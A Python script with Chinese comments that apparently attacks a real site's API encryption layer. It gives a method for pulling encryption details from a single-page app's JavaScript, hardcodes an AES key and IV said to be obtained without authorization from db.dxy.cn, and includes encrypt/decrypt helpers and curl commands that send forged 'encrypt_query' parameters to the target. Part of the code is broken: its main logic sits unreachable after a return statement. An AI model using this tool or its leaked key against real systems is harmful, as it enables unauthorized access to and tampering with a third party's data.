#!/usr/bin/env python3
# 从 Vite/React SPA 的 chunk 里反推「接口加密通道」，再用未授权下发的密钥解密/伪造 encrypt_query。
# 通用思路（换成别的 SPA 也适用）：
#   1) HTML 里 grep 所有 assets/*.js，全量下载（含 modulepreload）
#   2) grep '`/[a-zA-Z][^`]{4,80}`' 提路由；grep 'axios.create|interceptors|CryptoJS|AES' 找加密层
#   3) 找到「取密钥的接口 + 密钥用法 + 被加密的接口白名单」三件套
#   4) 直接无凭据打取密钥接口；能拿到就说明加密层失守

import base64, subprocess, sys, urllib.parse
# ---- 参数守卫（无参数必须给出人话，不抛 traceback、不朝真实目标发包）----
import sys as _sys, os as _os
if len(_sys.argv) < 2:
    _u = '<参数...>'
    print("用法: " + _os.path.basename(__file__) + " " + _u, file=_sys.stderr)
    raise SystemExit(1)
# ---- 守卫结束 ----


# === 本次在 db.dxy.cn(insight_v3) 实测拿到的参数 ===
KEY = "oLiq3F76KeZTi26h"      # GET /v5/api/crypto 与 /dev/api/crypto 未授权返回(CORS *)
IV  = "p7lgEwvQTnZgpTZ5"

def _kh(s): return s.encode().hex()

def encrypt(plain: str) -> str:
    """CryptoJS.AES.encrypt(plain, Utf8.parse(key), {iv, mode:CBC, padding:Pkcs7}).toString()"""
    p = subprocess.run(["openssl","enc","-aes-128-cbc","-K",_kh(KEY),"-iv",_kh(IV),"-base64","-A"],
                       input=plain.encode(), capture_output=True, check=True)
    return p.stdout.decode().strip()

def decrypt(cipher_b64: str) -> str:
    p = subprocess.run(["openssl","enc","-aes-128-cbc","-d","-K",_kh(KEY),"-iv",_kh(IV),"-base64","-A"],
                       input=cipher_b64.encode(), capture_output=True)
    return p.stdout.decode(errors="replace")

    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        print(decrypt(sys.argv[2]))
    else:
        body = sys.argv[1] if len(sys.argv) > 1 else '{"projectId":89919}'
        c = encrypt(body)
        print("cipher      :", c)
        print("urlencoded  :", urllib.parse.quote(c, safe=""))
        print("roundtrip   :", decrypt(c))

# 用法：
#   python3 enc.py                          # 加密默认体
#   python3 enc.py '{"projectId":1}'        # 伪造任意业务参数
#   python3 enc.py -d 'XyNSWoPXu+82fiuAtxX8xV26FoRvfnZohKnLPm6v5CA='   # 解密站内 encrypt_query
# 投递（该产品拦截器约定：POST 时整个参数表变成单一 encrypt_query 表单字段；GET 时变成单个 query 参数）：
#   curl -k -X POST 'https://TARGET/v5/globaldrugproject/project-detail' \
#        -H 'Content-Type: application/x-www-form-urlencoded' \
#        --data-urlencode "encrypt_query=$(python3 enc.py '{"projectId":1}' | head -1 | awk '{print $3}')"
#   curl -k -G 'https://TARGET/v5/globaldrugproject/project-detail' \
#        --data-urlencode "encrypt_query=<cipher>"
